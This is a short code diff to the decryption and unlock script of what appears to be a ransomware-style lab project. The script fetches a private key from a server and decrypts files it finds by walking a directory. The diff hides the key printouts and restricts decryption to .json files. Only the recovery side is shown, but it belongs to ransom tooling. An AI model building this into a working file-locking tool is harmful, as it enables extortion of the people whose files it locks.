@@ -27,10 +27,11 @@ print(response.reason)
 print(response.text)
 
 response_json = response.json()[0]
-print("Response JSON: \n" + str(response_json))
 
-print("Public Key from JSON: " + response_json["public_key"])
-print("Private Key from JSON: " + response_json["private_key"])
+#  print("Response JSON: \n" + str(response_json))
+#
+#  print("Public Key from JSON: " + response_json["public_key"])
+#  print("Private Key from JSON: " + response_json["private_key"])
 
 privateKeyContents = response_json["private_key"]
 privateKeyContents = privateKeyContents.replace("*", "\n")
@@ -51,7 +52,8 @@ for root, dirs, files in os.walk("."):
         if(not (filePath.endswith(constants.PRIVATE_KEY_FILE_PATH) or
             filePath.endswith(constants.PUBLIC_KEY_FILE_PATH) or
             filePath.endswith(constants.PAYLOAD_FILE_PATH) or
-            filePath.endswith(constants.MY_UNLOCK_FILE_PATH))):
-
+            filePath.endswith(constants.MY_UNLOCK_FILE_PATH) or
+            (not filePath.endswith(".json"))
+            )):
                 # Decrypt the encrypted message
                 MyDecrypt.MyRSADecryptMAC(filePath, RSAPrivateKeyFilePath)
